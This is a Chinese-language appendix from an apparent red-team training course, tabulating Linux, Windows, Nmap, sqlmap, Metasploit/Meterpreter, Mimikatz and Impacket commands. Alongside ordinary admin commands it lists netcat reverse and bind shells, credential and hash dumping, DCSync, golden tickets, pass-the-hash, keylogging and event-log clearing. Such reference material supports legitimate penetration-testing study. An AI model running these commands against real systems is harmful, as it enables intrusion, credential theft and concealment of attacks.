---
outline: deep
---

# 附录B：常用命令速查表

> **难度等级：📋 参考**
>
> **预计学习时间：30分钟**

---

## 📖 本附录概述

::: tip 附录内容
本附录汇总了渗透测试中最常用的命令，涵盖Linux、Windows、网络工具、渗透测试工具四大类，方便日常工作中快速查阅。
:::

---

## 一、Linux常用命令（50+）

### 1.1 基础命令

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `ls` | 列出目录内容 | `ls -la` 详细列表；`ls -lh` 人类可读大小 |
| `cd` | 切换目录 | `cd /root`；`cd ..` 上级目录；`cd ~` 家目录 |
| `pwd` | 显示当前路径 | `pwd` |
| `mkdir` | 创建目录 | `mkdir dirname`；`mkdir -p a/b/c` 递归创建 |
| `rm` | 删除文件/目录 | `rm file`；`rm -rf dir` 递归强制删除 |
| `cp` | 复制文件 | `cp src dst`；`cp -r src_dir dst_dir` |
| `mv` | 移动/重命名 | `mv old new`；`mv file /path/` |
| `cat` | 查看文件内容 | `cat file.txt` |
| `more` / `less` | 分页查看文件 | `less file.txt`（支持上下翻页） |
| `head` | 查看文件开头 | `head -20 file.txt` 前20行 |
| `tail` | 查看文件结尾 | `tail -f log.txt` 实时查看；`tail -20 file` |
| `find` | 查找文件 | `find / -name "*.conf"`；`find / -perm -u=s` |
| `which` | 查找命令位置 | `which python` |
| `whereis` | 查找文件位置 | `whereis nginx` |
| `echo` | 输出文本 | `echo "hello"`；`echo $PATH` 输出变量 |
| `clear` | 清屏 | `clear` 或快捷键 Ctrl+L |
| `man` | 查看帮助手册 | `man nmap` |
| `--help` | 查看命令帮助 | `ls --help` |
| `history` | 查看历史命令 | `history`；`!100` 执行第100条 |
| `alias` | 设置别名 | `alias ll='ls -la'` |

### 1.2 文件操作

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `chmod` | 修改文件权限 | `chmod 755 file`；`chmod +x script.sh` |
| `chown` | 修改文件所有者 | `chown user:group file` |
| `chattr` | 修改文件属性 | `chattr +i file` 锁定文件 |
| `ln` | 创建链接 | `ln -s target linkname` 软链接 |
| `tar` | 打包压缩 | `tar -zcvf file.tar.gz dir/` 打包；`tar -zxvf file.tar.gz` 解压 |
| `zip` / `unzip` | zip压缩/解压 | `zip -r file.zip dir/`；`unzip file.zip` |
| `gzip` / `gunzip` | gzip压缩 | `gzip file`；`gunzip file.gz` |
| `wc` | 统计行数/字数 | `wc -l file.txt` 行数；`wc -w` 字数 |
| `diff` | 比较文件差异 | `diff file1 file2` |
| `sort` | 排序 | `sort file.txt`；`sort -u` 去重排序 |
| `uniq` | 去重 | `sort file \| uniq` |
| `cut` | 切割文本 | `cut -d: -f1 /etc/passwd` |
| `tr` | 字符替换 | `cat file \| tr 'a-z' 'A-Z'` |
| `dd` | 文件转换/复制 | `dd if=/dev/zero of=file bs=1M count=10` |

### 1.3 网络命令

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `ifconfig` / `ip a` | 查看网卡信息 | `ip addr show`；`ifconfig eth0` |
| `ping` | 测试连通性 | `ping 192.168.1.1`；`ping -c 4 target` |
| `traceroute` | 路由追踪 | `traceroute target.com` |
| `netstat` | 网络连接 | `netstat -tulnp` 监听端口；`netstat -an` 所有连接 |
| `ss` | 网络连接（替代netstat） | `ss -tulnp`；`ss -s` 连接统计 |
| `curl` | 网络请求 | `curl http://target.com`；`curl -I url` 只看头 |
| `wget` | 文件下载 | `wget http://url/file`；`wget -c url` 断点续传 |
| `nc` (netcat) | 网络瑞士军刀 | `nc -lvp 4444` 监听；`nc ip port` 连接 |
| `nslookup` | DNS查询 | `nslookup target.com` |
| `dig` | DNS查询 | `dig target.com`；`dig @8.8.8.8 target.com MX` |
| `host` | DNS查询 | `host target.com` |
| `arp` | ARP表查看 | `arp -a` |
| `route` | 路由表 | `route -n` |
| `iptables` | 防火墙规则 | `iptables -L` 查看规则；`iptables -F` 清空 |
| `tcpdump` | 抓包 | `tcpdump -i eth0 -w file.pcap` |

### 1.4 系统管理

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `uname` | 系统信息 | `uname -a` 全部信息；`uname -r` 内核版本 |
| `hostname` | 主机名 | `hostname`；`hostnamectl set-hostname newname` |
| `whoami` | 当前用户 | `whoami` |
| `id` | 用户ID信息 | `id`；`id username` |
| `who` / `w` | 在线用户 | `who`；`w`（更详细） |
| `useradd` | 添加用户 | `useradd username`；`useradd -m -s /bin/bash user` |
| `userdel` | 删除用户 | `userdel -r username` |
| `passwd` | 修改密码 | `passwd`；`passwd username` |
| `su` | 切换用户 | `su - root`；`su username` |
| `sudo` | 以管理员执行 | `sudo command` |
| `ps` | 进程查看 | `ps aux`；`ps -ef` |
| `top` / `htop` | 进程监控 | `top`；`htop`（更友好） |
| `kill` | 结束进程 | `kill pid`；`kill -9 pid` 强制结束 |
| `service` / `systemctl` | 服务管理 | `systemctl start nginx`；`systemctl status ssh` |
| `df` | 磁盘使用 | `df -h` 人类可读 |
| `du` | 目录大小 | `du -sh dir/`；`du -h --max-depth=1` |
| `free` | 内存使用 | `free -h`；`free -m`（MB） |
| `uptime` | 运行时间 | `uptime` |
| `date` | 日期时间 | `date`；`date -s "2024-01-01 12:00:00"` |
| `reboot` | 重启 | `reboot` |
| `shutdown` | 关机 | `shutdown -h now`；`shutdown -r +10` 10分钟后重启 |
| `uname -a` | 系统详细信息 | 内核版本、架构等 |

### 1.5 文本处理

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `grep` | 文本搜索 | `grep "pattern" file`；`grep -r "pattern" dir/` 递归 |
| `egrep` | 扩展正则搜索 | `egrep "pattern1\|pattern2" file` |
| `sed` | 流编辑器 | `sed 's/old/new/g' file` 替换；`sed -n '1,10p' file` |
| `awk` | 文本处理 | `awk '{print $1}' file` 第一列；`awk -F: '{print $3}' /etc/passwd` |
| `grep -v` | 反向匹配 | `grep -v "exclude" file` |
| `grep -i` | 忽略大小写 | `grep -i "pattern" file` |
| `grep -n` | 显示行号 | `grep -n "pattern" file` |

### 1.6 提权相关

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `find / -perm -u=s 2>/dev/null` | 查找SUID文件 | 查找所有设置了SUID位的文件 |
| `find / -perm -g=s 2>/dev/null` | 查找SGID文件 | 查找所有设置了SGID位的文件 |
| `sudo -l` | 查看sudo权限 | 查看当前用户可执行的sudo命令 |
| `cat /etc/passwd` | 查看用户列表 | 系统所有用户信息 |
| `cat /etc/shadow` | 查看密码哈希 | 需要root权限 |
| `cat /etc/sudoers` | sudo配置 | sudo权限配置文件 |
| `id` | 用户和组信息 | 查看当前用户的UID、GID、组 |
| `groups` | 用户所属组 | `groups username` |
| `ls -la /etc/cron*` | 定时任务 | 查看cron任务 |
| `crontab -l` | 当前用户定时任务 | 查看当前用户的crontab |
| `dpkg -l` / `rpm -qa` | 已安装软件包 | Debian/RedHat系列 |
| `uname -r` | 内核版本 | 查找内核漏洞用 |
| `getcap -r / 2>/dev/null` | 查找Capabilities | 查找有特殊能力的文件 |

---

## 二、Windows常用命令（40+）

### 2.1 基础命令

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `dir` | 列出目录内容 | `dir`；`dir /a` 包括隐藏文件 |
| `cd` | 切换目录 | `cd C:\path`；`cd ..` 上级目录 |
| `md` / `mkdir` | 创建目录 | `mkdir newdir` |
| `rd` / `rmdir` | 删除目录 | `rd /s /q dirname` 递归删除 |
| `del` | 删除文件 | `del file.txt`；`del *.log` |
| `copy` | 复制文件 | `copy src dst` |
| `xcopy` | 高级复制 | `xcopy src dst /s /e` 递归复制 |
| `move` | 移动/重命名 | `move old new` |
| `type` | 查看文件内容 | `type file.txt` |
| `more` | 分页查看 | `type file.txt \| more` |
| `ren` | 重命名 | `ren oldname newname` |
| `cls` | 清屏 | `cls` |
| `echo` | 输出文本 | `echo hello`；`echo %PATH%` |
| `help` | 查看帮助 | `help command` |
| `ver` | 系统版本 | `ver` |

### 2.2 用户管理

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `whoami` | 当前用户 | `whoami`；`whoami /priv` 查看权限 |
| `whoami /all` | 完整用户信息 | 用户、组、权限、令牌 |
| `net user` | 用户列表 | `net user`；`net user username` 查看详细 |
| `net user username password /add` | 添加用户 | 添加本地用户 |
| `net user username /del` | 删除用户 | 删除本地用户 |
| `net localgroup` | 本地组列表 | `net localgroup` |
| `net localgroup groupname /add` | 创建组 | 创建本地组 |
| `net localgroup groupname username /add` | 用户加入组 | 将用户添加到组 |
| `net localgroup administrators` | 管理员组 | 查看管理员组成员 |
| `net accounts` | 账户策略 | 密码策略、账户锁定策略 |

### 2.3 网络命令

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `ipconfig` | 网络配置 | `ipconfig`；`ipconfig /all` 详细信息 |
| `ipconfig /displaydns` | DNS缓存 | 查看本地DNS缓存 |
| `ipconfig /flushdns` | 清空DNS缓存 | 清除DNS缓存 |
| `ping` | 测试连通性 | `ping 192.168.1.1`；`ping -t target` 持续ping |
| `tracert` | 路由追踪 | `tracert target.com` |
| `netstat` | 网络连接 | `netstat -ano` 所有连接+PID；`netstat -rn` 路由表 |
| `netstat -ano \| findstr LISTENING` | 监听端口 | 查看所有监听的端口 |
| `nslookup` | DNS查询 | `nslookup target.com` |
| `net view` | 查看共享 | `net view`；`net view \\hostname` |
| `net use` | 映射网络驱动器 | `net use Z: \\host\share`；`net use * /del` 删除 |
| `net share` | 查看共享 | `net share` 查看本机共享 |
| `route print` | 路由表 | 打印路由表 |
| `arp -a` | ARP表 | 查看ARP缓存表 |
| `curl` | 网络请求 | Windows 10+自带 |

### 2.4 系统信息

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `systeminfo` | 系统详细信息 | 系统版本、补丁、域信息等 |
| `hostname` | 主机名 | `hostname` |
| `ver` | 系统版本 | `ver` |
| `wmic os get` | 操作系统信息 | `wmic os get name,version` |
| `wmic qfe get` | 已安装补丁 | `wmic qfe get hotfixid,installedon` |
| `wmic product get` | 已安装软件 | `wmic product get name,version` |
| `wmic service get` | 服务列表 | `wmic service get name,state,startmode` |
| `wmic process get` | 进程列表 | `wmic process get name,processid` |
| `wmic useraccount get` | 用户账户 | `wmic useraccount get name,sid` |
| `tasklist` | 进程列表 | `tasklist`；`tasklist /svc` 服务对应进程 |
| `taskkill` | 结束进程 | `taskkill /pid 1234 /f` 强制结束 |
| `sc` | 服务管理 | `sc query` 服务列表；`sc start servicename` |
| `net start` | 启动的服务 | `net start` 列出已启动服务 |
| `schtasks` | 计划任务 | `schtasks /query /fo LIST /v` 查看所有任务 |
| `quser` / `query user` | 在线用户 | 查看当前登录用户 |
| `qwinsta` | 会话列表 | 查看RDP会话 |

### 2.5 服务管理

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `net start` | 启动服务 | `net start servicename` |
| `net stop` | 停止服务 | `net stop servicename` |
| `net pause` | 暂停服务 | `net pause servicename` |
| `sc config` | 配置服务 | `sc config servicename start= auto` |
| `sc create` | 创建服务 | `sc create servicename binPath= "path"` |
| `sc delete` | 删除服务 | `sc delete servicename` |

### 2.6 域相关

| 命令 | 功能说明 | 常用参数/示例 |
|------|---------|-------------|
| `net user /domain` | 域用户列表 | 查看域内所有用户 |
| `net group /domain` | 域组列表 | 查看域内所有组 |
| `net group "domain admins" /domain` | 域管理员组 | 查看域管理员组成员 |
| `net accounts /domain` | 域账户策略 | 查看域密码策略 |
| `net time /domain` | 域时间服务器 | 查看域控时间 |
| `net view /domain` | 域内计算机 | 查看域内所有计算机 |
| `nltest /dclist:domain` | 域控列表 | 列出所有域控制器 |
| `nltest /dsgetdc:domain` | 当前域控 | 获取当前认证的域控 |
| `dsquery user` | 查询域用户 | `dsquery user -name admin*` |
| `dsquery computer` | 查询域计算机 | `dsquery computer` |
| `dsget user` | 用户详细信息 | `dsget user "DN" -memberof` |

---

## 三、网络工具命令（20+）

### 3.1 Nmap常用命令

| 命令 | 功能说明 | 示例 |
|------|---------|------|
| 基础扫描 | 扫描常用端口 | `nmap 192.168.1.1` |
| 全端口扫描 | 扫描1-65535端口 | `nmap -p- 192.168.1.1` |
| 指定端口 | 扫描指定端口 | `nmap -p 22,80,443 192.168.1.1` |
| SYN扫描 | 半开放扫描（需root） | `nmap -sS 192.168.1.1` |
| UDP扫描 | UDP端口扫描 | `nmap -sU 192.168.1.1` |
| 服务版本 | 探测服务版本 | `nmap -sV 192.168.1.1` |
| 操作系统探测 | 探测目标OS | `nmap -O 192.168.1.1` |
| 脚本扫描 | 默认安全脚本 | `nmap -sC 192.168.1.1` |
| 漏洞脚本 | 漏洞检测脚本 | `nmap --script=vuln 192.168.1.1` |
| 综合扫描 | 版本+脚本+操作系统 | `nmap -A 192.168.1.1` |
| 快速扫描 | 快速模式 | `nmap -T4 -F 192.168.1.1` |
| 存活探测 | 只探测存活 | `nmap -sn 192.168.1.0/24` |
| 绕过防火墙 | 分片、诱饵等 | `nmap -f -D decoy1,decoy2 target` |
| 指定网卡 | 指定出口网卡 | `nmap -e eth0 target` |
| 输出到文件 | 输出扫描结果 | `nmap -oN result.txt target` |

### 3.2 netstat 常用命令

| 命令 | 功能说明 |
|------|---------|
| `netstat -tulnp` (Linux) | 查看所有监听的TCP/UDP端口（含进程） |
| `netstat -an` | 查看所有网络连接 |
| `netstat -rn` | 查看路由表 |
| `netstat -ano` (Windows) | 所有连接+PID |
| `netstat -ano \| findstr LISTENING` | Windows查看监听端口 |

### 3.3 curl / wget 常用命令

| 命令 | 功能说明 |
|------|---------|
| `curl http://url` | 发送GET请求 |
| `curl -I http://url` | 只获取响应头 |
| `curl -v http://url` | 详细输出（含请求头） |
| `curl -X POST -d "a=1&b=2" url` | 发送POST请求 |
| `curl -H "Cookie: a=b" url` | 自定义请求头 |
| `curl -u user:pass url` | 基本认证 |
| `curl -x http://proxy:port url` | 使用代理 |
| `curl -O http://url/file` | 下载文件 |
| `wget http://url/file` | 下载文件 |
| `wget -c http://url/file` | 断点续传 |
| `wget -r -np -k http://url` | 镜像网站 |

### 3.4 nc (netcat) 常用命令

| 命令 | 功能说明 |
|------|---------|
| `nc -lvp 4444` | 监听4444端口（等待连接） |
| `nc 192.168.1.1 4444` | 连接到指定IP和端口 |
| `nc -lvp 4444 -e /bin/bash` | 绑定Shell（Linux） |
| `nc -lvp 4444 -e cmd.exe` | 绑定Shell（Windows） |
| `nc ip port -e /bin/bash` | 反向Shell |
| `nc -w 3 ip port < file` | 发送文件 |
| `nc -lvp port > file` | 接收文件 |
| `nc -zv ip 1-1000` | 端口扫描 |
| `nc -u ip port` | UDP模式 |

### 3.5 dig / nslookup 常用命令

| 命令 | 功能说明 |
|------|---------|
| `dig target.com` | 查询A记录 |
| `dig target.com MX` | 查询MX记录（邮件） |
| `dig target.com NS` | 查询NS记录（域名服务器） |
| `dig target.com TXT` | 查询TXT记录 |
| `dig target.com ANY` | 查询所有记录 |
| `dig @8.8.8.8 target.com` | 指定DNS服务器 |
| `dig -x 8.8.8.8` | 反向查询（PTR） |
| `dig target.com +short` | 简洁输出 |
| `nslookup target.com` | 查询域名 |
| `nslookup -type=mx target.com` | 指定类型查询 |

### 3.6 iptables 常用命令

| 命令 | 功能说明 |
|------|---------|
| `iptables -L` | 查看所有规则 |
| `iptables -L -n --line-numbers` | 查看规则（数字格式+行号） |
| `iptables -F` | 清空所有规则 |
| `iptables -A INPUT -p tcp --dport 80 -j ACCEPT` | 允许80端口 |
| `iptables -A INPUT -p tcp --dport 22 -j DROP` | 拒绝22端口 |
| `iptables -I INPUT 1 -s ip -j ACCEPT` | 插入规则到第一条 |
| `iptables -D INPUT 1` | 删除第一条规则 |
| `iptables -t nat -L` | 查看NAT表规则 |
| `iptables-save > file` | 保存规则 |
| `iptables-restore < file` | 恢复规则 |

---

## 四、渗透测试常用命令（30+）

### 4.1 sqlmap 常用命令

| 命令 | 功能说明 |
|------|---------|
| `sqlmap -u "http://url?id=1"` | 检测GET参数注入 |
| `sqlmap -u url --data "post=data"` | 检测POST参数注入 |
| `sqlmap -u url --cookie "a=b"` | 带Cookie检测 |
| `sqlmap -u url --dbs` | 获取所有数据库 |
| `sqlmap -u url -D dbname --tables` | 获取指定库的所有表 |
| `sqlmap -u url -D db -T table --columns` | 获取指定表的所有列 |
| `sqlmap -u url -D db -T table --dump` | 导出表数据 |
| `sqlmap -u url --dump-all` | 导出所有数据库 |
| `sqlmap -u url --users` | 获取数据库用户列表 |
| `sqlmap -u url --passwords` | 获取用户密码哈希 |
| `sqlmap -u url --current-user` | 当前数据库用户 |
| `sqlmap -u url --current-db` | 当前数据库名 |
| `sqlmap -u url --is-dba` | 判断是否是DBA |
| `sqlmap -u url --os-shell` | 获取操作系统Shell |
| `sqlmap -u url --os-cmd "command"` | 执行系统命令 |
| `sqlmap -u url --sql-shell` | 获取SQL Shell |
| `sqlmap -u url --batch` | 自动回答默认选项 |
| `sqlmap -u url --tamper=script1,script2` | 使用篡改脚本绕过WAF |
| `sqlmap -u url --dbms=mysql` | 指定数据库类型 |
| `sqlmap -u url -p id` | 指定注入参数 |
| `sqlmap -u url --level 3 --risk 2` | 提高检测级别和风险 |
| `sqlmap -r request.txt` | 从文件读取请求 |
| `sqlmap -m urls.txt` | 批量扫描多个URL |

> 💡 **深入理解：命令速查表的正确使用姿势——"字典"不是"小说"**
>
> 很多初学者把命令速查表当"学习材料"来背，效率很低。
> 正确的定位是：**速查表 = 字典，不是课本。**
>
> ```
> 学英语的正确方法：先学语法和词汇，遇到不会的词查字典
> 学命令的正确方法：先理解原理和场景，忘记具体参数时查速查表
> ```
>
> 具体怎么用：
> ```
> 场景一：你知道做什么但忘了参数
>   "我要用nmap扫全端口，参数是啥来着？" → 翻表 → -p-
>
> 场景二：你知道有更好的命令但忘了叫什么
>   "Linux有个看日志的命令，能实时滚动，叫什么？" → 翻表 → tail -f
>
> 场景三：你想对比多种实现方法
>   "文件传输有多少种方法？" → 翻表 → 对比所有下载命令
> ```
>
> **一个有趣的自我检验方法**：
> 随便挑表中的一个命令，你能不能闭着眼睛说出：
> 1. 这个命令是干什么的？（功能）
> 2. 什么场景下用？（场景）
> 3. 最常见的2-3个参数是？（用法）
> 4. 它的输出长什么样？（熟悉）
>
> 如果都能答上，这个命令你算真正掌握了。
> 如果只能答"干什么的"但说不出场景和参数，那还差得远。

### 4.2 Metasploit 常用命令

| 命令 | 功能说明 |
|------|---------|
| `msfconsole` | 启动MSF控制台 |
| `msfdb init` | 初始化数据库 |
| `search keyword` | 搜索模块 |
| `use module_path` | 使用模块 |
| `show options` | 查看模块参数 |
| `show payloads` | 查看可用Payload |
| `set OPTION value` | 设置参数 |
| `setg OPTION value` | 设置全局参数 |
| `show targets` | 查看目标类型 |
| `info` | 查看模块详细信息 |
| `run` / `exploit` | 执行攻击 |
| `exploit -j` | 后台执行 |
| `sessions -l` | 列出所有会话 |
| `sessions -i id` | 进入指定会话 |
| `sessions -k id` | 结束指定会话 |
| `background` | 将会话放到后台 |
| `jobs` | 查看后台任务 |
| `kill job_id` | 终止后台任务 |
| `db_nmap target` | 将Nmap扫描结果存入数据库 |
| `db_hosts` | 查看数据库中的主机 |
| `db_services` | 查看数据库中的服务 |

**Meterpreter 常用命令：**

| 命令 | 功能说明 |
|------|---------|
| `help` | 查看帮助 |
| `sysinfo` | 系统信息 |
| `getuid` | 当前用户 |
| `getsystem` | 尝试提权到System |
| `hashdump` | 导出密码哈希 |
| `shell` | 获取系统Shell |
| `upload src dst` | 上传文件 |
| `download src dst` | 下载文件 |
| `cat file` | 查看文件内容 |
| `ls` / `cd` / `pwd` | 文件操作 |
| `ps` | 列出进程 |
| `migrate pid` | 迁移到指定进程 |
| `execute -f cmd.exe -i` | 执行程序并交互 |
| `portfwd add -l 3389 -p 3389 -r ip` | 端口转发 |
| `route add subnet mask session_id` | 添加路由 |
| `run post/...` | 运行后渗透模块 |
| `load kiwi` | 加载Mimikatz模块 |
| `creds_all` | （Kiwi）获取所有凭据 |
| `screenshare` | 屏幕共享 |
| `webcam_list` | 摄像头列表 |
| `keyscan_start` | 键盘记录开始 |
| `keyscan_dump` | 导出键盘记录 |
| `clearev` | 清除事件日志 |

### 4.3 Nmap 渗透相关命令

| 命令 | 功能说明 |
|------|---------|
| `nmap --script=auth target` | 认证类漏洞扫描 |
| `nmap --script=brute target` | 暴力破解 |
| `nmap --script=vuln target` | 漏洞扫描 |
| `nmap --script=smb-* target` | SMB相关扫描 |
| `nmap --script smb-os-discovery target` | SMB系统发现 |
| `nmap --script smb-vuln-ms17-010 target` | MS17-010检测 |
| `nmap --script http-enum target` | HTTP枚举 |
| `nmap --script http-vuln-* target` | HTTP漏洞扫描 |
| `nmap --script ftp-anon target` | FTP匿名登录检测 |
| `nmap --script dns-zone-transfer target` | DNS域传送检测 |

### 4.4 Mimikatz 常用命令

| 命令 | 功能说明 |
|------|---------|
| `privilege::debug` | 获取调试权限 |
| `sekurlsa::logonpasswords` | 获取登录密码 |
| `sekurlsa::msv` | 获取NTLM哈希 |
| `sekurlsa::wdigest` | 获取Wdigest密码 |
| `sekurlsa::kerberos` | 获取Kerberos票据 |
| `sekurlsa::tickets /export` | 导出所有票据 |
| `sekurlsa::pth /user:admin /domain:test /ntlm:hash` | 哈希传递 |
| `kerberos::list` | 列出票据 |
| `kerberos::ptt ticket.kirbi` | 注入票据 |
| `kerberos::golden ...` | 生成黄金票据 |
| `lsadump::lsa /inject` | LSA转储 |
| `lsadump::sam` | 转储SAM哈希 |
| `lsadump::dcsync /domain:test.local /user:krbtgt` | DCSync攻击 |
| `lsadump::dcsync /domain:test.local /all` | 导出所有域用户哈希 |
| `vault::cred` | 查看凭据管理器 |
| `token::elevate` | 提升令牌权限 |
| `exit` | 退出Mimikatz |

### 4.5 Impacket 常用命令

| 命令 | 功能说明 |
|------|---------|
| `psexec.py user:pass@ip` | PsExec远程执行（交互式） |
| `psexec.py -hashes lm:ntlm user@ip` | 哈希传递PsExec |
| `smbexec.py user:pass@ip` | SMB远程执行 |
| `wmiexec.py user:pass@ip` | WMI远程执行 |
| `atexec.py user:pass@ip "command"` | 计划任务执行命令 |
| `dcomexec.py user:pass@ip` | DCOM远程执行 |
| `secretsdump.py user:pass@ip` | 转储本地/域哈希 |
| `secretsdump.py -just-dc user@dc_ip` | DCSync导出域哈希 |
| `GetNPUsers.py domain/ -usersfile users.txt` | AS-REP Roasting |
| `GetUserSPNs.py domain/user:pass -request` | Kerberoasting |
| `GetADUsers.py domain/user:pass -all` | 枚举域用户 |
| `smbclient.py user:pass@ip` | SMB客户端 |
| `smbserver.py share /path` | 搭建SMB服务器 |
| `ticketer.py ...` | 创建票据（黄金/白银） |
| `mssqlclient.py user:pass@ip` | MSSQL客户端 |
| `rdp_check.py user:pass@ip` | RDP登录检测 |
| `lookupsid.py user:pass@ip` | SID枚举 |
| `samrdump.py user:pass@ip` | SAMR信息枚举 |

---

## 五、命令速查索引

### 我想做什么 → 找什么命令

| 我想做什么 | Linux命令 | Windows命令 |
|-----------|----------|------------|
| 查看当前用户 | `whoami` | `whoami` |
| 查看IP地址 | `ip a` / `ifconfig` | `ipconfig` |
| 查看监听端口 | `netstat -tulnp` / `ss -tulnp` | `netstat -ano \| findstr LISTEN` |
| 查看系统信息 | `uname -a` | `systeminfo` |
| 查看用户列表 | `cat /etc/passwd` | `net user` |
| 查看进程 | `ps aux` / `top` | `tasklist` / `taskmgr` |
| 查看路由表 | `route -n` / `ip route` | `route print` |
| 测试端口连通 | `nc -zv ip port` | `telnet ip port` |
| 下载文件 | `wget` / `curl -O` | `certutil -urlcache -split -f url` |
| 查找文件 | `find / -name filename` | `dir /s filename` |
| 查看计划任务 | `crontab -l` | `schtasks /query` |
| 查看服务列表 | `systemctl list-units --type=service` | `net start` / `sc query` |
| 提权信息收集 | `sudo -l` / `find / -perm -u=s` | `whoami /priv` / `systeminfo` |

---

## 🔗 相关链接

- [⬅️ 上一章：---](/redteam/day110-appendix-附录A-红队常用工具速查表)
- [➡️ 下一章：---](/redteam/day112-appendix-附录C-常见端口对照表)
- [📖 返回全书目录](/redteam/day118-toc-全书目录)
